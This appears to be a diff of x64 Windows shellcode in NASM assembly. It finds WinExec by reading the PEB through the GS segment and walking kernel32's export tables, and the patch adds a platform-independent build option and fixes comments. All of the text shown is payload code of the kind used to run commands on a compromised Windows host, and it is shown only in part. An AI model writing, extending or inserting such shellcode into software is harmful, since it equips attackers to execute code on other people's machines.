@@ -13,6 +13,10 @@ BITS 64
 %ifdef STACK_ALIGN
     AND     SP, 0xFFF8
 %endif
+
+%ifdef PLATFORM_INDEPENDENT
+    CQO                                   ; RDX = 0 (eax == 0)
+%endif
     PUSH    BYTE 0x60                     ; 
     POP     RBX                           ; RBX = 0x60
     MOV     RSI, [GS:RBX]                 ; RSI = [TEB + 0x60] = PEB
@@ -30,9 +34,11 @@ BITS 64
 ; Found export names table (RSI)
     MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
 ; Found export ordinals table offset (RCX)
+%ifndef PLATFORM_INDEPENDENT
     CQO                                   ; RDX = 0 (eax == userland addresss, so MSB is not set)
+%endif
 find_winexec_x64:
-    INC     RDX                           ; EDX = function number + 1
+    INC     RDX                           ; RDX = function number + 1
     XOR     RAX, RAX                      ; RAX = 0
     LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
     CMP     [RDI + RAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
